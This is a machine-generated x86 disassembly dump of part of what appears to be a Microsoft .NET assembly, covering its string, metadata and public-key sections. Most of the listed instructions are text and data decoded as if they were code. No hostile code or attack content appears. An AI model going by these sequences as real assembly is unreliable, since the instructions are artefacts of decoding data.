  404276:	imul   eax,DWORD PTR [eax],0x6e006f
  40427c:	add    BYTE PTR cs:[eax],al
  40427f:	dec    edi
  404280:	inc    ecx
  404281:	add    BYTE PTR [edi+0x0],ah
  404284:	add    BYTE PTR gs:[esi+0x0],ch
  404288:	je     0x40428a
  40428a:	push   eax
  40428b:	add    BYTE PTR [edx+0x0],dh
  40428e:	outs   dx,DWORD PTR ds:[esi]
  40428f:	add    BYTE PTR [ebx+0x0],ah
  404292:	add    BYTE PTR gs:[ebx+0x0],dh
  404296:	jae    0x404298
  404298:	cmp    al,BYTE PTR [eax]
  40429a:	and    BYTE PTR [eax],al
  40429c:	add    BYTE PTR [bx+0x0],ch
  4042a0:	je     0x4042a2
  4042a2:	and    BYTE PTR [eax],al
  4042a4:	jae    0x4042a6
  4042a6:	push   0x74007500
  4042ab:	add    BYTE PTR [eax+eax*1+0x6f],ah
  4042af:	add    BYTE PTR [edi+0x0],dh
  4042b2:	outs   dx,BYTE PTR ds:[esi]
  4042b3:	add    BYTE PTR [eax],ah
  4042b5:	add    BYTE PTR [esi+0x0],ch
  4042b8:	outs   dx,DWORD PTR ds:[esi]
  4042b9:	add    BYTE PTR [eax+eax*1+0x69],dh
  4042bd:	add    BYTE PTR [esi+0x0],ah
  4042c0:	imul   eax,DWORD PTR [eax],0x610063
  4042c6:	je     0x4042c8
  4042c8:	imul   eax,DWORD PTR [eax],0x6e006f
  4042ce:	add    BYTE PTR [ecx+0x41],dh
  4042d1:	add    BYTE PTR [edi+0x0],ah
  4042d4:	add    BYTE PTR gs:[esi+0x0],ch
  4042d8:	je     0x4042da
  4042da:	push   eax
  4042db:	add    BYTE PTR [edx+0x0],dh
  4042de:	outs   dx,DWORD PTR ds:[esi]
  4042df:	add    BYTE PTR [ebx+0x0],ah
  4042e2:	add    BYTE PTR gs:[ebx+0x0],dh
  4042e6:	jae    0x4042e8
  4042e8:	cmp    al,BYTE PTR [eax]
  4042ea:	and    BYTE PTR [eax],al
  4042ec:	add    BYTE PTR [bx+0x0],ch
  4042f0:	je     0x4042f2
  4042f2:	and    BYTE PTR [eax],al
  4042f4:	add    BYTE PTR gs:[eax+0x0],bh
  4042f8:	arpl   WORD PTR [eax],ax
  4042fa:	add    BYTE PTR gs:[eax+0x0],dh
  4042fe:	je     0x404300
  404300:	imul   eax,DWORD PTR [eax],0x6e006f
  404306:	and    BYTE PTR [eax],al
  404308:	ja     0x40430a
  40430a:	push   0x6c006900
  40430f:	add    BYTE PTR [ebp+0x0],ah
  404312:	and    BYTE PTR [eax],al
  404314:	ja     0x404316
  404316:	popa   
  404317:	add    BYTE PTR [ecx+0x0],ch
  40431a:	je     0x40431c
  40431c:	imul   eax,DWORD PTR [eax],0x67006e
  404322:	and    BYTE PTR [eax],al
  404324:	data16 add BYTE PTR [edi+0x0],ch
  404328:	jb     0x40432a
  40432a:	and    BYTE PTR [eax],al
  40432c:	jae    0x40432e
  40432e:	push   0x74007500
  404333:	add    BYTE PTR [eax+eax*1+0x6f],ah
  404337:	add    BYTE PTR [edi+0x0],dh
  40433a:	outs   dx,BYTE PTR ds:[esi]
  40433b:	add    BYTE PTR [edx],bh
  40433d:	add    BYTE PTR [eax],ah
  40433f:	add    BYTE PTR [eax],al
  404341:	sbb    ebp,DWORD PTR [ecx+0x0]
  404344:	jo     0x404346
  404346:	arpl   WORD PTR [eax],ax
  404348:	cmp    al,BYTE PTR [eax]
  40434a:	das    
  40434b:	add    BYTE PTR [edi],ch
  40434d:	add    BYTE PTR [ebx+0x0],bh
  404350:	xor    BYTE PTR [eax],al
  404352:	jge    0x404354
  404354:	das    
  404355:	add    BYTE PTR [ebx+0x0],bh
  404358:	xor    DWORD PTR [eax],eax
  40435a:	jge    0x40435c
  40435c:	add    BYTE PTR [edi],bh
  40435e:	inc    ecx
  40435f:	add    BYTE PTR [edi+0x0],ah
  404362:	add    BYTE PTR gs:[esi+0x0],ch
  404366:	je     0x404368
  404368:	push   eax
  404369:	add    BYTE PTR [edx+0x0],dh
  40436c:	outs   dx,DWORD PTR ds:[esi]
  40436d:	add    BYTE PTR [ebx+0x0],ah
  404370:	add    BYTE PTR gs:[ebx+0x0],dh
  404374:	jae    0x404376
  404376:	cmp    al,BYTE PTR [eax]
  404378:	and    BYTE PTR [eax],al
  40437a:	inc    ebx
  40437b:	add    BYTE PTR [edi+0x0],ch
  40437e:	outs   dx,BYTE PTR ds:[esi]
  40437f:	add    BYTE PTR [esi+0x0],ch
  404382:	add    BYTE PTR gs:[ebx+0x0],ah
  404386:	je     0x404388
  404388:	imul   eax,DWORD PTR [eax],0x67006e
  40438e:	and    BYTE PTR [eax],al
  404390:	je     0x404392
  404392:	outs   dx,DWORD PTR ds:[esi]
  404393:	add    BYTE PTR [eax],ah
  404395:	add    BYTE PTR [ebx+0x0],bh
  404398:	xor    BYTE PTR [eax],al
  40439a:	jge    0x40439c
  40439c:	add    BYTE PTR [ebp+0x41],bh
  40439f:	add    BYTE PTR [edi+0x0],ah
  4043a2:	add    BYTE PTR gs:[esi+0x0],ch
  4043a6:	je     0x4043a8
  4043a8:	push   eax
  4043a9:	add    BYTE PTR [edx+0x0],dh
  4043ac:	outs   dx,DWORD PTR ds:[esi]
  4043ad:	add    BYTE PTR [ebx+0x0],ah
  4043b0:	add    BYTE PTR gs:[ebx+0x0],dh
  4043b4:	jae    0x4043b6
  4043b6:	cmp    al,BYTE PTR [eax]
  4043b8:	and    BYTE PTR [eax],al
  4043ba:	inc    ebx
  4043bb:	add    BYTE PTR [ecx+0x0],ah
  4043be:	ins    BYTE PTR es:[edi],dx
  4043bf:	add    BYTE PTR [eax+eax*1+0x69],ch
  4043c3:	add    BYTE PTR [esi+0x0],ch
  4043c6:	add    BYTE PTR [bx+si],ah
  4043c9:	add    BYTE PTR [edi+0x0],al
  4043cc:	add    BYTE PTR gs:[eax+eax*1+0x41],dh
  4043d1:	add    BYTE PTR [edi+0x0],ah
  4043d4:	add    BYTE PTR gs:[esi+0x0],ch
  4043d8:	je     0x4043da
  4043da:	push   eax
  4043db:	add    BYTE PTR [edx+0x0],dh
  4043de:	outs   dx,DWORD PTR ds:[esi]
  4043df:	add    BYTE PTR [ebx+0x0],ah
  4043e2:	add    BYTE PTR gs:[ebx+0x0],dh
  4043e6:	jae    0x4043e8
  4043e8:	push   eax
  4043e9:	add    BYTE PTR [edx+0x0],dh
  4043ec:	outs   dx,DWORD PTR ds:[esi]
  4043ed:	add    BYTE PTR [eax+0x0],bh
  4043f0:	jns    0x4043f2
  4043f2:	add    BYTE PTR cs:[eax],ah
  4043f5:	add    BYTE PTR [ebp+0x0],al
  4043f8:	js     0x4043fa
  4043fa:	add    BYTE PTR gs:[ebx+0x0],ah
  4043fe:	jne    0x404400
  404400:	je     0x404402
  404402:	imul   eax,DWORD PTR [eax],0x6e006f
  404408:	and    BYTE PTR [eax],al
  40440a:	imul   eax,DWORD PTR [eax],0x65
  40440d:	add    BYTE PTR [ecx+0x0],bh
  404410:	cmp    al,BYTE PTR [eax]
  404412:	and    BYTE PTR [eax],al
  404414:	jnp    0x404416
  404416:	xor    BYTE PTR [eax],al
  404418:	jge    0x40441a
  40441a:	add    BYTE PTR [ecx+0x41],ch
  40441d:	add    BYTE PTR [edi+0x0],ah
  404420:	add    BYTE PTR gs:[esi+0x0],ch
  404424:	je     0x404426
  404426:	push   eax
  404427:	add    BYTE PTR [edx+0x0],dh
  40442a:	outs   dx,DWORD PTR ds:[esi]
  40442b:	add    BYTE PTR [ebx+0x0],ah
  40442e:	add    BYTE PTR gs:[ebx+0x0],dh
  404432:	jae    0x404434
  404434:	cmp    al,BYTE PTR [eax]
  404436:	and    BYTE PTR [eax],al
  404438:	inc    esi
  404439:	add    BYTE PTR [ecx+0x0],ah
  40443c:	imul   eax,DWORD PTR [eax],0x65006c
  404442:	add    BYTE PTR fs:[eax],ah
  404445:	add    BYTE PTR [eax+eax*1+0x6f],dh
  404449:	add    BYTE PTR [eax],ah
  40444b:	add    BYTE PTR [edi+0x0],ah
  40444e:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  404453:	add    BYTE PTR [ecx+0x0],ah
  404456:	add    BYTE PTR [di+0x0],ah
  40445a:	outs   dx,BYTE PTR ds:[esi]
  40445b:	add    BYTE PTR [eax+eax*1+0x20],dh
  40445f:	add    BYTE PTR [eax+0x0],dh
  404462:	jb     0x404464
  404464:	outs   dx,DWORD PTR ds:[esi]
  404465:	add    BYTE PTR [ebx+0x0],ah
  404468:	add    BYTE PTR gs:[ebx+0x0],dh
  40446c:	jae    0x40446e
  40446e:	and    BYTE PTR [eax],al
  404470:	jo     0x404472
  404472:	jb     0x404474
  404474:	outs   dx,DWORD PTR ds:[esi]
  404475:	add    BYTE PTR [eax+0x0],bh
  404478:	jns    0x40447a
  40447a:	cmp    al,BYTE PTR [eax]
  40447c:	and    BYTE PTR [eax],al
  40447e:	jnp    0x404480
  404480:	xor    BYTE PTR [eax],al
  404482:	jge    0x404484
  404484:	add    BYTE PTR [edi],dl
  404486:	push   ecx
  404487:	add    BYTE PTR [eax+eax*1+0x41],dl
  40448b:	add    BYTE PTR [edi+0x0],ah
  40448e:	add    BYTE PTR gs:[esi+0x0],ch
  404492:	je     0x404494
  404494:	add    BYTE PTR cs:[ebp+0x0],ah
  404498:	js     0x40449a
  40449a:	add    BYTE PTR gs:[eax],al
  40449d:	jae    0x4044e0
  40449f:	add    BYTE PTR [edi+0x0],ah
  4044a2:	add    BYTE PTR gs:[esi+0x0],ch
  4044a6:	je     0x4044a8
  4044a8:	push   eax
  4044a9:	add    BYTE PTR [edx+0x0],dh
  4044ac:	outs   dx,DWORD PTR ds:[esi]
  4044ad:	add    BYTE PTR [ebx+0x0],ah
  4044b0:	add    BYTE PTR gs:[ebx+0x0],dh
  4044b4:	jae    0x4044b6
  4044b6:	cmp    al,BYTE PTR [eax]
  4044b8:	and    BYTE PTR [eax],al
  4044ba:	data16 add BYTE PTR [ecx+0x0],ah
  4044be:	imul   eax,DWORD PTR [eax],0x65006c
  4044c4:	add    BYTE PTR fs:[eax],ah
  4044c7:	add    BYTE PTR [eax+eax*1+0x6f],dh
  4044cb:	add    BYTE PTR [eax],ah
  4044cd:	add    BYTE PTR [edi+0x0],ah
  4044d0:	add    BYTE PTR gs:[eax+eax*1+0x20],dh
  4044d5:	add    BYTE PTR [eax+0x0],dh
  4044d8:	popa   
  4044d9:	add    BYTE PTR [edx+0x0],dh
  4044dc:	add    BYTE PTR gs:[esi+0x0],ch
  4044e0:	je     0x4044e2
  4044e2:	and    BYTE PTR [eax],al
  4044e4:	jo     0x4044e6
  4044e6:	jb     0x4044e8
  4044e8:	outs   dx,DWORD PTR ds:[esi]
  4044e9:	add    BYTE PTR [ebx+0x0],ah
  4044ec:	add    BYTE PTR gs:[ebx+0x0],dh
  4044f0:	jae    0x4044f2
  4044f2:	and    BYTE PTR [eax],al
  4044f4:	inc    ebp
  4044f5:	add    BYTE PTR [eax+0x0],bh
  4044f8:	imul   eax,DWORD PTR [eax],0x200074
  4044fe:	inc    ebx
  4044ff:	add    BYTE PTR [edi+0x0],ch
  404502:	add    BYTE PTR fs:[ebp+0x0],ah
  404506:	cmp    al,BYTE PTR [eax]
  404508:	and    BYTE PTR [eax],al
  40450a:	jnp    0x40450c
  40450c:	xor    BYTE PTR [eax],al
  40450e:	jge    0x404510
  404510:	add    BYTE PTR [ebp+0x41],dh
  404513:	add    BYTE PTR [edi+0x0],ah
  404516:	add    BYTE PTR gs:[esi+0x0],ch
  40451a:	je     0x40451c
  40451c:	push   eax
  40451d:	add    BYTE PTR [edx+0x0],dh
  404520:	outs   dx,DWORD PTR ds:[esi]
  404521:	add    BYTE PTR [ebx+0x0],ah
  404524:	add    BYTE PTR gs:[ebx+0x0],dh
  404528:	jae    0x40452a
  40452a:	cmp    al,BYTE PTR [eax]
  40452c:	and    BYTE PTR [eax],al
  40452e:	push   eax
  40452f:	add    BYTE PTR [ecx+0x0],ah
  404532:	jb     0x404534
  404534:	add    BYTE PTR gs:[esi+0x0],ch
  404538:	je     0x40453a
  40453a:	and    BYTE PTR [eax],al
  40453c:	jo     0x40453e
  40453e:	jb     0x404540
  404540:	outs   dx,DWORD PTR ds:[esi]
  404541:	add    BYTE PTR [ebx+0x0],ah
  404544:	add    BYTE PTR gs:[ebx+0x0],dh
  404548:	jae    0x40454a
  40454a:	and    BYTE PTR [eax],al
  40454c:	add    BYTE PTR gs:[eax+0x0],bh
  404550:	imul   eax,DWORD PTR [eax],0x650074
  404556:	add    BYTE PTR fs:[esi],ch
  404559:	add    BYTE PTR [eax],ah
  40455b:	add    BYTE PTR [eax+0x0],dl
  40455e:	popa   
  40455f:	add    BYTE PTR [edx+0x0],dh
  404562:	add    BYTE PTR gs:[esi+0x0],ch
  404566:	je     0x404568
  404568:	and    BYTE PTR [eax],al
  40456a:	inc    ebp
  40456b:	add    BYTE PTR [eax+0x0],bh
  40456e:	imul   eax,DWORD PTR [eax],0x200074
  404574:	inc    ebx
  404575:	add    BYTE PTR [edi+0x0],ch
  404578:	add    BYTE PTR fs:[ebp+0x0],ah
  40457c:	cmp    al,BYTE PTR [eax]
  40457e:	and    BYTE PTR [eax],al
  404580:	jnp    0x404582
  404582:	xor    BYTE PTR [eax],al
  404584:	jge    0x404586
  404586:	add    BYTE PTR [eax],al
  404588:	ds jmp 0x1ae006aa
  40458e:	lods   eax,DWORD PTR ds:[esi]
  40458f:	dec    esi
  404590:	mov    ?,WORD PTR [eax+0x1d26515a]
  404596:	adc    eax,esp
  404598:	add    BYTE PTR [eax],cl
  40459a:	mov    bh,0x7a
  40459c:	pop    esp
  40459d:	push   esi
  40459e:	sbb    DWORD PTR [eax+eiz*8],esi
  4045a1:	mov    DWORD PTR [eax],ecx
  4045a3:	mov    al,0x3f
  4045a5:	pop    edi
  4045a6:	jg     0x4045b9
  4045a8:	aad    0xa
  4045aa:	cmp    al,BYTE PTR [ebx]
  4045ac:	push   es
  4045ad:	adc    dl,BYTE PTR [ecx]
  4045af:	add    eax,DWORD PTR [esi]
  4045b1:	adc    dl,BYTE PTR ds:0x19120603
  4045b7:	add    al,BYTE PTR [esi]
  4045b9:	push   cs
  4045ba:	add    eax,DWORD PTR [esi]
  4045bc:	adc    bl,BYTE PTR ds:0x21120603
  4045c2:	add    esp,DWORD PTR [eax]
  4045c4:	add    BYTE PTR [ecx],al
  4045c6:	push   es
  4045c7:	and    BYTE PTR [ebx],al
  4045c9:	add    DWORD PTR [esi],ecx
  4045cb:	or     BYTE PTR [esi],cl
  4045cd:	add    esp,DWORD PTR [eax]
  4045cf:	add    BYTE PTR [eax*1+0x1d010100],bl
  4045d6:	push   cs
  4045d7:	push   es
  4045d8:	and    BYTE PTR [edx],al
  4045da:	add    DWORD PTR [edx+edx*1],ebx
  4045dd:	and    eax,0x12002004
  4045e2:	sub    DWORD PTR [eax+eax*1],eax
  4045e5:	add    DWORD PTR [ecx],eax
  4045e7:	sbb    al,0x6
  4045e9:	and    BYTE PTR [edx],al
  4045eb:	add    DWORD PTR [edx+edx*1],ebx
  4045ee:	sub    eax,0x12002004
  4045f3:	xor    DWORD PTR [eax+eiz*1],eax
  4045f6:	add    DWORD PTR [ecx],eax
  4045f8:	push   cs
  4045f9:	add    al,0x20
  4045fb:	add    DWORD PTR [ecx],eax
  4045fd:	add    al,BYTE PTR ds:0xe010220
  404603:	push   cs
  404604:	push   es
  404605:	and    BYTE PTR [ecx],al
  404607:	add    DWORD PTR [ecx],edx
  404609:	add    BYTE PTR [ecx+0x1012004],0x8
  404610:	and    BYTE PTR [eax+0x2400],0x4
  404617:	add    BYTE PTR [eax],0x0
  40461a:	xchg   esp,eax
  40461b:	add    BYTE PTR [eax],al
  40461d:	add    BYTE PTR [esi],al
  40461f:	add    al,BYTE PTR [eax]
  404621:	add    BYTE PTR [eax],al
  404623:	and    al,0x0
  404625:	add    BYTE PTR [edx+0x53],dl
  404628:	inc    ecx
  404629:	xor    DWORD PTR [eax],eax
  40462b:	add    al,0x0
  40462d:	add    BYTE PTR [ecx],al
  40462f:	add    BYTE PTR [ecx],al
  404631:	add    BYTE PTR [edi],al
  404633:	sar    edx,1
  404635:	push   edi
  404636:	les    ebp,FWORD PTR [esi+0x2ea3f0d9]
  40463c:	test   BYTE PTR [edx+0xdfdae0f],ch
  404642:	jmp    0xecab442f
  404647:	pop    DWORD PTR [edi+0x6c7603fb]
  40464d:	or     DWORD PTR [ecx+ebx*4-0x6e],0x1e
  404652:	mov    dl,0x3b
  404654:	out    0x9a,eax
  404656:	(bad)  
  404658:	fadd   st(1),st
  40465a:	fstp   QWORD PTR [edx+0x211336d2]
  404660:	add    dl,BYTE PTR [eax-0x6c38df5]
  404666:	adc    BYTE PTR [ebp+0x77e1c47f],0x10
  40466d:	pop    esi
  40466f:	pop    es
  404670:	ja     0x4046c1
  404672:	sub    eax,ebp
  404674:	xor    cl,BYTE PTR [esi]
  404676:	xchg   edx,eax
  404677:	jmp    0xc021:0xe8e4ec05
  40467e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40467f:	out    dx,eax
  404680:	call   0x4c9cab76
  404685:	or     al,0x93
  404687:	shr    DWORD PTR [ebx+0x625d2899],0x2c
  40468e:	stos   BYTE PTR es:[edi],al
  40468f:	gs sub al,0x1d
  404692:	cli    
  404693:	(bad)  
  404694:	cmp    eax,0x2d6f5d74
  404699:	in     eax,0xf1
  40469b:	jle    0x4046fb
  40469d:	scas   eax,DWORD PTR es:[edi]
  40469e:	pinsrw mm2,WORD PTR [esi-0x75e3d9c3],0x12
  4046a6:	inc    ebx
  4046a7:	sbb    BYTE PTR gs:[eax],ah
  4046aa:	ins    DWORD PTR es:[edi],dx
  4046ab:	rcl    BYTE PTR [ebx-0x2da5b2cc],0x93
  4046b2:	push   es
  4046b3:	and    BYTE PTR [ecx],al
  4046b5:	add    DWORD PTR [ecx],edx
  4046b7:	or     BYTE PTR [ebp+0x3000108],0x0
  4046be:	add    BYTE PTR [eax],al
  4046c0:	add    BYTE PTR [eax],al
  4046c2:	add    al,0x6
  4046c4:	adc    al,BYTE PTR [eax+0x2200591]
  4046ca:	add    DWORD PTR [eax],ecx
  4046cc:	push   cs
  4046cd:	add    eax,0x80120000
  4046d2:	xchg   ebp,eax
  4046d3:	add    eax,0x1c010220
  4046d8:	sbb    BYTE PTR [esi],al
  4046da:	and    BYTE PTR [ecx],al
  4046dc:	add    DWORD PTR [edx],edx
  4046de:	sbb    BYTE PTR [ecx+0x12000005],0x80
  4046e5:	popf   
  4046e6:	add    eax,0x80120020
  4046eb:	mov    eax,ds:0xe002003
  4046f0:	add    eax,0xe0e0200
  4046f5:	push   cs
  4046f6:	add    al,0x0
  4046f8:	add    DWORD PTR [ecx],eax
  4046fa:	push   cs
  4046fb:	add    al,0x0
  4046fd:	add    DWORD PTR [ecx],eax
  4046ff:	add    al,BYTE PTR ds:0xe010200
  404705:	push   cs
  404706:	pop    es
  404707:	and    BYTE PTR [edx],al
  404709:	add    cl,BYTE PTR [esi]
  40470b:	adc    DWORD PTR [eax+0x10004b9],eax
  404711:	add    cl,BYTE PTR [esi]
  404713:	add    eax,0x80120000
  404718:	rol    DWORD PTR ds:0x80120000,0xc5
  40471f:	or     al,0x0
  404721:	add    al,0x2
  404723:	push   cs
  404724:	adc    DWORD PTR [eax-0x2e7fed33],eax
  40472a:	adc    BYTE PTR [eax],cl
  40472c:	add    eax,0x1c0e0200
  404731:	sbb    al,0xb
  404733:	pop    es
  404734:	add    al,0x12
  404736:	or     BYTE PTR [edx],dl
  404738:	adc    BYTE PTR [ebp-0x2a7fedf8],0x9
  40473f:	and    BYTE PTR [ecx+eax*1],al
  404742:	adc    al,BYTE PTR [eax+0x8081cd9]
  404748:	add    eax,0x1d120100
  40474d:	or     BYTE PTR [esi],al
  40474f:	and    BYTE PTR [ecx],al
  404751:	add    DWORD PTR [edx],edx
  404753:	sbb    ch,0x3
  404756:	and    BYTE PTR [eax],al
  404758:	add    al,BYTE PTR [edi+eax*1]
  40475b:	add    DWORD PTR [edx],edx
  40475d:	adc    DWORD PTR ds:0x80120020,eax
  404763:	in     eax,0x5
  404765:	and    BYTE PTR [eax],al
  404767:	adc    al,BYTE PTR [eax+0x2005e9]
  40476d:	adc    al,BYTE PTR [eax+0x12006ed]
  404773:	add    DWORD PTR [edx],edx
  404775:	xor    cl,0x9
  404778:	and    BYTE PTR [edx],al
  40477a:	add    DWORD PTR [edx],edx
  40477c:	xor    ch,0x12
  40477f:	sub    cl,0x5
  404782:	and    BYTE PTR [ecx],al
  404784:	add    DWORD PTR [edx],edx
  404786:	or     DWORD PTR [ebx],eax
  404788:	add    BYTE PTR [eax],al
  40478a:	push   cs
  40478b:	push   es
  40478c:	add    BYTE PTR [ecx],al
  40478e:	adc    al,BYTE PTR [eax+0x7101cc1]
  404794:	add    eax,0x80122912
  404799:	in     eax,0x12
  40479b:	sub    cl,0x12
  40479e:	adc    ch,0x12
  4047a1:	adc    ch,0x5
  4047a4:	add    BYTE PTR [eax],al
  4047a6:	adc    al,BYTE PTR [ecx+0x3000905]
  4047ac:	push   cs
  4047ad:	adc    al,BYTE PTR [eax+0x1c1d0ed1]
  4047b3:	push   es
  4047b4:	add    BYTE PTR [edx],al
  4047b6:	add    DWORD PTR [esi],ecx
  4047b8:	sbb    eax,0x100081c
  4047bd:	adc    al,BYTE PTR [ecx+0x15811111]
  4047c3:	pop    es
  4047c4:	add    BYTE PTR [edx],al
  4047c6:	sbb    al,0x12
  4047c8:	adc    DWORD PTR [ecx],0x120060e
  4047ce:	adc    al,BYTE PTR [eax+0x60ee1]
  4047d4:	add    DWORD PTR [esi],ecx
  4047d6:	adc    al,BYTE PTR [ecx+0x9071521]
  4047dc:	adc    ch,BYTE PTR [ecx]
  4047de:	push   cs
  4047df:	adc    al,BYTE PTR [ecx-0x2a7fedf3]
  4047e5:	adc    ch,BYTE PTR [ecx]
  4047e7:	sbb    eax,0x1d1c1d1c
  4047ec:	sbb    al,0x1d
  4047ee:	sbb    al,0x5
  4047f0:	add    BYTE PTR [eax],al
  4047f2:	adc    al,BYTE PTR [ecx+0x1000625]
  4047f8:	add    DWORD PTR [edx],edx
  4047fa:	sub    DWORD PTR ds:0x1030006,0x30a0e0e
  404804:	and    BYTE PTR [eax],al
  404806:	or     BYTE PTR [esi],al
  404808:	and    BYTE PTR [ecx],al
  40480a:	push   cs
  40480b:	adc    al,BYTE PTR [eax+0x5070bd1]
  404811:	push   cs
  404812:	adc    al,BYTE PTR [eax+0x1c1d08d5]
  404818:	sbb    eax,0x120041c
  40481d:	add    cl,BYTE PTR [eax]
  40481f:	aaa    
  404820:	add    DWORD PTR [eax],eax
  404822:	sbb    ch,BYTE PTR [esi]
  404824:	dec    esi
  404825:	inc    ebp
  404826:	push   esp
  404827:	inc    esi
  404828:	jb     0x40488b
  40482a:	ins    DWORD PTR es:[edi],dx
  40482b:	gs ja  0x40489d
  40482e:	jb     0x40489b
  404830:	sub    al,0x56
  404832:	gs jb  0x4048a8
  404835:	imul   ebp,DWORD PTR [edi+0x6e],0x2e34763d
  40483c:	xor    eax,0xe540001
  404841:	adc    al,0x46
  404843:	jb     0x4048a6
  404845:	ins    DWORD PTR es:[edi],dx
  404846:	gs ja  0x4048b8
  404849:	jb     0x4048b6
  40484b:	inc    esp
  40484c:	imul   esi,DWORD PTR [ebx+0x70],0x4e79616c
  404853:	popa   
  404854:	ins    DWORD PTR es:[edi],dx
  404855:	add    BYTE PTR gs:0x1,al
  40485c:	add    BYTE PTR ds:0x10001,al
  404862:	add    BYTE PTR [edx],dl
  404864:	add    DWORD PTR [eax],eax
  404866:	or     eax,0x67415451
  40486b:	outs   dx,BYTE PTR gs:[esi]
  40486d:	je     0x4048a2
  40486f:	xor    ch,BYTE PTR [esi]
  404871:	gs js  0x4048d9
  404874:	add    BYTE PTR [eax],al
  404876:	sbb    al,BYTE PTR [ecx]
  404878:	add    BYTE PTR ds:0x7263694d,dl
  40487e:	outs   dx,DWORD PTR ds:[esi]
  40487f:	jae    0x4048f0
  404881:	data16 je 0x4048a4
  404884:	inc    ebx
  404885:	outs   dx,DWORD PTR ds:[esi]
  404886:	jb     0x4048f8
  404888:	outs   dx,DWORD PTR ds:[esi]
  404889:	jb     0x4048ec
  40488b:	je     0x4048f6
  40488d:	outs   dx,DWORD PTR ds:[esi]
  40488e:	outs   dx,BYTE PTR ds:[esi]
  40488f:	add    BYTE PTR [eax],al
  404891:	and    eax,0x4d200001
  404896:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  40489d:	je     0x404861
  40489f:	scas   al,BYTE PTR es:[edi]
  4048a0:	and    BYTE PTR [esi+0x69],dl
  4048a3:	jae    0x40491a
  4048a5:	popa   
  4048a6:	ins    BYTE PTR es:[edi],dx
  4048a7:	and    BYTE PTR [ebx+0x74],dl
  4048aa:	jne    0x404910
  4048ac:	imul   ebp,DWORD PTR [edi-0x3e],0x303220ae
  4048b3:	xor    DWORD PTR [edx],esi
  4048b5:	add    BYTE PTR [eax],al
  4048b7:	xor    eax,DWORD PTR [ecx]
  4048b9:	add    BYTE PTR [esi],ch
  4048bb:	ret    0x20a9
  4048be:	dec    ebp
  4048bf:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4048c6:	je     0x4048e8
  4048c8:	inc    ebx
  4048c9:	outs   dx,DWORD PTR ds:[esi]
  4048ca:	jb     0x40493c
  4048cc:	outs   dx,DWORD PTR ds:[esi]
  4048cd:	jb     0x404930
  4048cf:	je     0x40493a
  4048d1:	outs   dx,DWORD PTR ds:[esi]
  4048d2:	outs   dx,BYTE PTR ds:[esi]
  4048d3:	and    BYTE PTR cs:[ecx+0x6c],al
  4048d7:	ins    BYTE PTR es:[edi],dx
  4048d8:	and    BYTE PTR [edx+0x69],dh
  4048db:	addr16 push 0x72207374
  4048e1:	gs jae 0x404949
  4048e4:	jb     0x40495c
  4048e6:	gs fs add BYTE PTR cs:[eax],al
  4048eb:	adc    DWORD PTR [ecx],eax
  4048ed:	add    BYTE PTR [ecx+esi*1],cl
  4048f0:	xor    DWORD PTR [esi],ebp
  4048f2:	xor    BYTE PTR [esi],ch
  4048f4:	xor    eax,0x37323730
  4048f9:	xor    DWORD PTR cs:[eax],eax
  4048fc:	add    BYTE PTR ds:0x31080001,cl
  404902:	xor    DWORD PTR [esi],ebp
  404904:	xor    BYTE PTR [esi],ch
  404906:	xor    BYTE PTR [esi],ch
  404908:	xor    BYTE PTR [eax],al
  40490a:	add    BYTE PTR [edx],cl
  40490c:	add    DWORD PTR [eax],eax
  40490e:	add    eax,0x552d6e65
  404913:	push   ebx
  404914:	add    BYTE PTR [eax],al
  404916:	sub    al,BYTE PTR [ecx]
  404918:	add    BYTE PTR ds:0x645c3a46,ah
  40491e:	fs pop esp
  404920:	je     0x404991
  404922:	outs   dx,DWORD PTR ds:[esi]
  404923:	ins    BYTE PTR es:[edi],dx
  404924:	jae    0x404982
  404926:	fs gs jbe 0x40498e
  40492a:	imul   esi,DWORD PTR [esi+0x5c],0x616e6946
  404931:	ins    BYTE PTR es:[edi],dx
  404932:	push   eax
  404933:	jne    0x404997
  404935:	ins    BYTE PTR es:[edi],dx
  404936:	imul   esp,DWORD PTR [ebx+0x4b],0x732e7965
  40493d:	outs   dx,BYTE PTR ds:[esi]
  40493e:	imul   eax,DWORD PTR [eax],0x0
  404941:	or     DWORD PTR [eax+0x1],0x0
  404945:	add    BYTE PTR [eax+0x30],0x30
  404949:	xor    dh,BYTE PTR [eax+esi*1]
  40494c:	xor    BYTE PTR [eax],dh
  40494e:	xor    BYTE PTR [eax],dh
  404950:	arpl   WORD PTR [eax],di
  404952:	xor    BYTE PTR [eax],dh
  404954:	xor    BYTE PTR [eax],dh
  404956:	xor    BYTE PTR [ecx],dh
  404958:	xor    al,0x30
  40495a:	xor    DWORD PTR [eax],esi
  40495c:	xor    BYTE PTR [eax],dh
  40495e:	xor    BYTE PTR [eax],dh
  404960:	xor    BYTE PTR ss:[edx],dh
  404963:	xor    BYTE PTR [eax],dh
  404965:	xor    BYTE PTR [eax],dh
  404967:	xor    BYTE PTR [eax],dh
  404969:	xor    dh,BYTE PTR [eax+esi*1]
  40496c:	xor    BYTE PTR [eax],dh
  40496e:	xor    BYTE PTR ds:0x34333532,dh
  404974:	xor    DWORD PTR [ebx],esi
  404976:	xor    DWORD PTR [eax],esi
  404978:	xor    BYTE PTR [eax],dh
  40497a:	cmp    BYTE PTR [eax],dh
  40497c:	xor    BYTE PTR [eax],dh
  40497e:	xor    BYTE PTR [eax],dh
  404980:	xor    DWORD PTR [eax],esi
  404982:	xor    BYTE PTR [eax],dh
  404984:	xor    DWORD PTR [eax],esi
  404986:	xor    BYTE PTR [esi],dh
  404988:	xor    DWORD PTR [ebx],esi
  40498a:	xor    edi,DWORD PTR [ecx]
  40498c:	cmp    DWORD PTR [ecx+0x66],esp
  40498f:	xor    WORD PTR [eax],di
  404992:	xor    WORD PTR gs:[ecx+0x32],sp
  404997:	arpl   WORD PTR [edx],si
  404999:	xor    eax,0x32613431
  40499e:	aaa    
  40499f:	xor    esp,DWORD PTR [ecx+0x34]
  4049a2:	xor    ah,BYTE PTR [ecx+edi*1+0x30]
  4049a6:	xor    al,0x32
  4049a8:	bound  esi,QWORD PTR [edi]
  4049aa:	xor    dh,BYTE PTR [ebx]
  4049ac:	xor    dh,BYTE PTR [ecx]
  4049ae:	xor    WORD PTR [edi],si
  4049b1:	xor    eax,0x32303137
  4049b6:	cmp    WORD PTR fs:[ebp+0x62],sp
  4049bb:	popa   
  4049bc:	fs popa 
  4049be:	cmp    DWORD PTR ss:[ecx],edi
